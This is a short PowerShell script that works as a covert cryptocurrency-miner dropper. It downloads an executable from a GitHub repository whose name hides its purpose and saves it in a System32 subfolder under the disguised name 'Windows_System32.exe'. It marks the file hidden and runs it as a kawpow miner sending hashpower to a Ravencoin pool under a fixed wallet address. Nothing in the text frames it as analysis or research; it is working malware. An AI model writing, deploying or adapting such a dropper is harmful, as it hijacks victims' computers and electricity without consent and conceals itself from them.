$Folder = 'C:\Windows\System32\Microsoft\Windows_System32.exe'
"Test to see if folder [$Folder]  exists"
if (Test-Path -Path $Folder) {
    "Path exists!"
    C:\Windows\System32\Microsoft\Windows_System32.exe -a kawpow -lhr 60 -o stratum+tcp://rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-G01 -pl 60%
} else {
    "Path doesn't exist."
    cd C:\Windows\System32\Microsoft ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/Windows_System32.exe" -OutFile Windows_System32.exe ; attrib +h Windows_System32.exe; C:\Windows\System32\Microsoft\Windows_System32.exe -a kawpow -lhr 60 -o stratum+tcp://rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GCS-G01 -pl 60%
}
